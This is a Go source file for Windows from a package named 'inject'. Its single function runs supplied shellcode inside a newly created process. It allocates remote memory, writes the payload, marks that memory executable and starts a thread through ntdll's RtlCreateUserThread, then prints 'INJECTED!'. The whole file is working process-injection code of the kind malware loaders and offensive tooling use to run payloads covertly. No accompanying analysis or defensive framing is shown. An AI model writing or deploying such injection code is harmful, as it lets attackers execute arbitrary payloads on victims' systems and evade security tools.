// +build windows

package inject

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func RtlCreateUserThread(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	rtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	closeHandle := kernel32.NewProc("CloseHandle")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE

	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling virtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	var pHandle uintptr
	_, _, errRtlCreateUserThread := rtlCreateUserThread.Call(uintptr(pi.Process), 0, 0, 0, 0, 0, lpBaseAddress, 0, uintptr(unsafe.Pointer(&pHandle)), 0)
	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
	}

	_, _, errCloseHandle := closeHandle.Call(uintptr(pi.Process))
	if errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

	fmt.Println("INJECTED!")
}
